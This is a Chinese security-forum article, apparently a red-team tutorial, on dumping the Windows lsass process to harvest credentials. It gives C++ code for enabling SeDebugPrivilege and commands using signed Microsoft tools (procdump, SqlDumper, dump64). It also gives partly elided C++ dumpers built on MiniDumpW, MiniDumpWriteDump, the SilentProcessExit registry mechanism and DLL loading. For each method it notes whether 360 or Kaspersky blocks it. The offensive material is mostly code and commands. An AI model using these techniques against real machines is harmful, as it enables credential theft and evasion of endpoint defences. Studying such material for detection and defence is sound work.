<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [forum.butian.net](https://forum.butian.net/share/2094)

> 奇安信攻防社区 - 关于 Dump lsass

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。（本文仅用于交流学习）

基础知识
----

windows 中密码一般由两部分组成，LM Hash 与 NTLM Hash。  
windows 中 Hash 的结构如下： username:RID:LM-HASH:NT-HASH

（个人版 windows Vista 以后，服务器版 windows Server 2003 以后操作系统的认证方式都为 NTLM Hash） 通常可从 Windows 系统中的 SAM 文件和域控的 NTDS.dit 文件（在域环境中，用户信息存储在 NTDS.dit 中）中获得所有用户的 Hash。也可以通过 Mimikatz 读取 lsass.exe 进程获得已登录用户的 NTLM hash 和明文值 。

简易防范： 在 WinSer12 中新增了 Protected Users 全局安全组，将需要保护的用户放入该组，便无法使用 Mimikatz 等工具抓取 Hash 值和明文密码。  
安装 KB2871997: Microsoft KB2871997 的学习  
注：安装 KB2871997 后，普通用户无法使用常规的 Hash 值传递攻击，但 SID 500 (Administrator) 账号依然中可以进行 Hash 传递攻击。 修改注册表禁止在内存中存储明文密码  
关闭 Wdigest 功能（WinSer12 及以上版本默认关闭 Wdigest），防止用户密码在内存中以明文形式泄露。Wdigest 功能开启时，攻击者可以使用工具获取明文密码；反之，不能。  
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken：默认设置为 0。如果设置为 1，则 SID 为 500 的管理员也不能通过网络登录的方式获取高权限。

权限提升
----

SeDebugPrivilege 是调试权限的程序，开启了这个特权之后可以可以读写 system 启动的进程的内存，很显然我们想要 dump 或者 OpenProcess 下 lsass.exe 进程，那么肯定需要 SeDebugPrivilege 权限

```
whoami /priv
```

我们以普通用户开启一个 cmd 窗口进行查看，发现并没有找到 SeDebugPrivilege

![](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-673232d88b9ed73323e05aaa4d45d387aec27592.png)  
我们以管理员身份启动一个 cmd 窗口进行查看，显示我们想要开启 SeDebugPrivilege 特权，那么需要管理员权限

![](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-2ce95b46561f6a13023497c0a059c837e66f3cfb.png)  
如果想要更详细的说明，建议去 msdn 看官方文档，话不多说我们来看看如何开启 SeDebugPrivilege 特权

### 修改访问令牌

OpenProcessToken、LookupPrivilegeValue、AdjustTokenPrivileges 三个函数的实现，对照 msdn 文档一目了然

```
#include 
#include 

using namespace std;

void GetPrivilege() {
    HANDLE TokenHandle = NULL;

    BOOL Open = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &TokenHandle);
    if (Open != 0) {

        TOKEN_PRIVILEGES tp;
        tp.PrivilegeCount = 1;
        BOOL Lookup = LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
        tp.Privileges[0].Attributes = true ? SE_PRIVILEGE_ENABLED : 0;
        if (Lookup != 0) {

            BOOL AdjustToken = AdjustTokenPrivileges(TokenHandle, FALSE, &tp, sizeof(tp), NULL, NULL);
            if (AdjustToken != 0)
            {
                CloseHandle(TokenHandle);
                cout << "AdjustTokenPrivileges Success" << endl;
            }
            else
            {
                cout << "AdjustTokenPrivileges Error" << endl;
            }
        }
        else
        {
            cout << "LookupPrivilegeValue Error" << endl;
        }
    }
    else
    {
        cout << "OpenProcessToken Error" << endl;
    }
}

void main() {
    GetPrivilege();
    system("cmd");
}
```

![](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-96c7391fad220ef217876dec1e1b74f3a90ba021.png)

### RtlAdjustPrivilege

这个函数是未公开函数，很是厉害，该函数在 ntdll.dll 这个动态链接库，因此直接动态调用即可

函数结构

```
NTSTATUS RtlAdjustPrivilege
(
        ULONG Privilege,        #权限ID
    BOOL Enable,        #True是打开，False是关闭
    BOOL CurrentThread, #True是提升当前线程权限，False是提升整个进程权限
    PULONG Enabled      #指针，内容是特权未修改的状态，最后一个参数别设置为NULL
);
```

```
#include 
#include 

using namespace std;

typedef NTSTATUS(WINAPI* _RtlAdjustPrivilege)(
    ULONG Privilege, BOOL Enable, BOOL CurrentThread, PULONG Enabled
    );

_RtlAdjustPrivilege RtlAdjustPrivilege = (_RtlAdjustPrivilege)GetProcAddress(GetModuleHandle("ntdll.dll"), "RtlAdjustPrivilege");

int SeDebugPrivilege() {
    ULONG t;
    RtlAdjustPrivilege(20, TRUE, FALSE, &t);
    if (RtlAdjustPrivilege == NULL) {
        cout << "Unable to resolve RtlAdjustPrivilege" << endl;
        return 0;
    }

    cout << "RtlAdjustPrivilege Success" << endl;
}

void main() {
    SeDebugPrivilege();
    system("cmd");
}
```

![](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-9545f53fd19593080f512ac4ce861370bab8f011.png)  
接下来进入正题

白名单文件
-----

### procdump

ProcDump 是一个命令行实用工具，其主要用途是监视应用程序的 CPU 峰值，并在出现峰值期间生成故障转储，管理员或开发人员可以使用这些转储来确定峰值的原因。

因此其是自带微软签名的

![](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-c3f9ac2f407da215450b24251ba454eb4b51e763.png)

```
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

![](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-9ddf4c3041595c65a0f6b0e905db3ed72fa52443.png)  
实际中 360 会直接查杀

![](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-84e2dc4ea2c54fdb12f9b317138cd658a10f7d4d.png)  
卡巴斯基虽然不会查杀，但是其敏感进程会拦截

![](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-e58af849c54700c28a0007b1137a2279b070889a.png)

### SQLDumper

作为 SQL External minidumper 文件，它是为在 Microsoft SQL Server 中使用而由 inFlow Inventory Software 创建的。

同样其文件具有微软的签名（360、卡巴斯基无法抓取）

![](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-1740c6c43942995969e46e5565a5a6603614f12e.png)

```
tasklist /svc | findstr "lsass.exe"

SqlDumper.exe pid 0 0x01100
```

### dump64

这个是 Visual Studio 中自带的，因此也是具有微软的签名

![](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-f3e8baef24d7c72fe6875d8c78d0de9eb1d1ebf6.png)

```
dump64.exe pid d:\a.dmp
```

卡巴斯基无法导出文件

![](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-c2d5aaba297ecdb88771f2588080069af5ba6a4c.png)  
360 直接拦截

![](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-7178192fadcf23ae3dd9c747218e09ed9b96b371.png)

### DumpMinitool.exe

推特上大哥分享的 LOLBIN，Visual Studio 中自带的程序  
路径

```
C:\Program Files\Microsoft Visual Studio\2022\Community\Common7\IDE\Extensions\TestPlatform\Extensions
```

卡巴斯基过不了  
除了白名单我们还可以直接利用函数来实现 dump

MiniDumpW
---------

comsvcs.dll 转储 MiniDumpW，MiniDumpW 是 comsvcs.dll 中的函数

```
dumpbin /exports C:\Windows\System32\comsvcs.dll
```

![](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-d930a2d223d04d9815c89390c6af0fac9bc8aa7e.png)

### 代码实现

*   通过 CreateToolhelp32Snapshot 函数对所有进程进行快照的拍摄
*   利用 RtlAdjustPrivilege 函数对进程进行权限提升
*   利用 Process32First、Process32Next 函数，遍历拍摄的快照，寻找 lsass.exe 进程，获得其 Pid
*   动态调用 MiniDumpW 函数进行 dump  
    很明了了，根据 msdn 文档对照即可实现

```
#include 
#include 
#include 
#include 
#include 
#include 

using namespace std;

...............................
...............................
...............................

_RtlAdjustPrivilege RtlAdjustPrivilege = (_RtlAdjustPrivilege)GetProcAddress(GetModuleHandle("ntdll.dll"), "RtlAdjustPrivilege");

//获取SeDebugPrivilege,最后一个参数别设置为NULL
int SeDebugPrivilege() {
    ULONG t;
    RtlAdjustPrivilege(20, TRUE, FALSE, &t);
    if (RtlAdjustPrivilege == NULL) {
        cout << "Unable to resolve RtlAdjustPrivilege" << endl;
        return 0;
    }

    cout << "RtlAdjustPrivilege Success" << endl;
}

int main(int argc, char* argv[]) {

    DWORD pid;
    PROCESSENTRY32 ed;
    ed.dwSize = sizeof(PROCESSENTRY32);
        ...............................
        ...............................
    ...............................
    cout << "MiniDumpW Success" << endl;
    cout << "C:\\Windows\\Temp\\" << a << endl;

    return 0;
}
```

卡巴斯基无法导出文件

![](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-685da47a20adc27d510e774ee8b643389b8a6965.png)  
360 核晶无法导出完整文件

MiniDumpWriteDump
-----------------

函数参考官方手册，很简单一目了然

[https://learn.microsoft.com/zh-cn/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump](https://learn.microsoft.com/zh-cn/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump)

### 代码实现

*   通过 CreateToolhelp32Snapshot 函数对所有进程进行快照的拍摄
*   利用 RtlAdjustPrivilege 函数对进程进行权限提升
*   利用 Process32First、Process32Next 函数，遍历拍摄的快照，寻找 lsass.exe 进程，获得其 Pid
*   OpenProcess 函数获得 lsass.exe 进程的句柄
*   然后利用 MiniDumpWriteDump 函数从内存中进行 dump

```
#include 
#include 
#include 
#include 
#include 
#include 

using namespace std;

#pragma comment( lib, "DbgHelp.lib" )

typedef NTSTATUS(WINAPI* _RtlAdjustPrivilege)(
    ULONG Privilege, BOOL Enable, BOOL CurrentThread, PULONG Enabled
    );

_RtlAdjustPrivilege RtlAdjustPrivilege = (_RtlAdjustPrivilege)GetProcAddress(GetModuleHandle("ntdll.dll"), "RtlAdjustPrivilege");

//获取SeDebugPrivilege,最后一个参数别设置为NULL
int SeDebugPrivilege() {
    ULONG t;
    RtlAdjustPrivilege(20, TRUE, FALSE, &t);
    if (RtlAdjustPrivilege == NULL) {
        cout << "Unable to resolve RtlAdjustPrivilege" << endl;
        return 0;
    }

    cout << "RtlAdjustPrivilege Success" << endl;
}

int main() {

    DWORD pid;
    PROCESSENTRY32 ed;
    ed.dwSize = sizeof(PROCESSENTRY32);

    ...............................
        ...............................
    ...............................

    SeDebugPrivilege();
    HANDLE Open_Handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    ...............................
        ...............................
    ...............................
    if (isDumped == TRUE) {
        cout << "Success" << endl;
    }
    else
    {
        cout << "MiniDumpWriteDump Error" << endl;
    }

    return 0;
}
```

对于卡巴斯基任然无法导出

![](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-741091f53a3f9a9c524c3a8027af3ff902f1b71b.png)  
360 核晶无法导出完整文件

![](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-fa5a0321118e929eccb4010a26627e9042152a3f.png)

RtlReportSilentProcessExit 静默退出
-------------------------------

之前有个操作就是利用蓝屏崩溃来进行转储绕过卡巴斯基进行 dump，但是把对方电脑都弄蓝屏了这显示不实用。 在 win7 之后，windows 引入了一些进程退出的相关机制，即 Selftermination 的 ExitProcess. 与 Crossprocesstermination 的 TerminateProcess. 这次利用的就是 Silent Process Exit（静默退出）。

我们可以调用 ntdll.dll 的 RtlReportSilentProcessExit() 函数，我们可以利用其进行转储文件又不会导致程序崩溃（因为 lsass 进程崩溃可能会导致电脑重启）

我们首先要在注册表中设置如下（有点像 IFEO 是吧）

```
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Option\
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\
```

其中 HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Option \ 的 GlobalFlag 键设置为 FLG_MONITOR_SILENT_PROCESS_EXIT (0x200)

![](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-cc57f6bb7ab0dafa5fd723e8c36ff0984e2ce442.png)

![](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-50832e9ac71f6ab9ff4ea7842ad932bee6a7fdaa.png)  
在 HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit 项下设置三个属性

详细参考 MSDN（非常的详细了）

[https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/registry-entries-for-silent-process-exit](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/registry-entries-for-silent-process-exit)

```
ReportingMode (REG_DWORD) 需要执行的操作
* LAUNCH_MONITORPROCESS (0x1) – 启动一个监控进程
* LOCAL_DUMP (0x2) – 为导致终止的进程和被终止的进程创建转储文件
* NOTIFICATION (0x4) – 显示弹出通知
LocalDumpFolder(REG_SZ) 转储文件保存的路径
DumpType(REG_DWORD)转储文件类型
```

### 代码实现

通过 RegCreateKeyExA、RegSetValueExA 函数设置好上述两个注册表

```
#include 
#include 
#include 
#include 
#include 
#include 

using namespace std;

    ...............................
        ...............................
    ...............................

_RtlAdjustPrivilege RtlAdjustPrivilege = (_RtlAdjustPrivilege)GetProcAddress(GetModuleHandle("ntdll.dll"), "RtlAdjustPrivilege");

//获取SeDebugPrivilege,最后一个参数别设置为NULL
int SeDebugPrivilege() {
    ULONG t;
    RtlAdjustPrivilege(20, TRUE, FALSE, &t);
    if (RtlAdjustPrivilege == NULL) {
        cout << "Unable to resolve RtlAdjustPrivilege" << endl;
        return 0;
    }

    cout << "RtlAdjustPrivilege Success" << endl;
}

int Get_Pid() {
    HRESULT hr;

    DWORD pid;
    PROCESSENTRY32 ed;
    ed.dwSize = sizeof(PROCESSENTRY32);

    ...............................
        ...............................
    ...............................

    if (RegCreate == ERROR_SUCCESS) {

        cout << "RegCreateKeyExA Success" << endl;

        DWORD GlobalFlag = 0x200;
        LSTATUS RegSetValue_GlobalFlag = RegSetValueExA(phkResult, "GlobalFlag", 0, REG_DWORD, (const BYTE*)&GlobalFlag, sizeof(DWORD));

    ...............................
        ...............................
    ...............................

            if (RegSetValue_ReportingMode == ERROR_SUCCESS && RegSetValue_LocalDumpFolder == ERROR_SUCCESS
                && RegSetValue_DumpType == ERROR_SUCCESS) {

                cout << "RegSetValue_All Success" << endl;
            }
            else
            {
                cout << "RegSetValue_One Error" << endl;
            }

            }
        else
        {
            cout << "RegCreateKeyExA SilentProcessExit Error" << endl;
        }
    }
    else
    {
        cout << "RegCreateKeyExA Error" << endl;
    }

    return 0;
}

int main(int argc, char* argv) {

    Reg_Set();
    DWORD pid = Get_Pid();
    cout << "Lsass Pid is:" << pid << endl;

    ...............................
        ...............................
    ...............................

        cout << "Path：C:\\tmp" << endl;
    }
    else {
        cout << "OpenProcess Error" << endl;
    }

    return 0;
}
```

360 会检测其对注册表的操作

卡巴斯基同样无法导出

![](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-ffeff9236ca666b16d8f857ed92f2342a3ba862a.png)

通过 Dll 加载
---------

具体实现都差不多，只不过写在了 Dll 里面

### 代码实现

```
#include <Windows.h>
#include <iostream>
#include <tlhelp32.h>
#include <processthreadsapi.h>
#include <DbgHelp.h>

#pragma comment( lib, "DbgHelp.lib" )

...............................
...............................
...............................

//获取SeDebugPrivilege,最后一个参数别设置为NULL
int SeDebugPrivilege() {
    ULONG t;
    RtlAdjustPrivilege(20, TRUE, FALSE, &t);
    if (RtlAdjustPrivilege == NULL) {
        cout << "Unable to resolve RtlAdjustPrivilege.\n" << endl;
        return 0;
    }

    cout << "RtlAdjustPrivilege Success" << endl;
}

void Dump() {

    DWORD pid;
    DWORD gid;
    PROCESSENTRY32 ed;
    ...............................
        ...............................
    ...............................

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        Dump();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

卡巴斯基过不了

最后
--

本篇只是列出了一些常规的方法，还有一些方法没有介绍到比如 ssp 等  
最后

![](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-7c966fcf962bfe4983c400d59cd243156c9b4ef2.png)

![](https://shs3.b.qianxin.com/attack_forum/2023/01/attach-53b0436b32fbfce453a6b7a864c013d2cdc10e91.png)  
卡巴斯基也是一样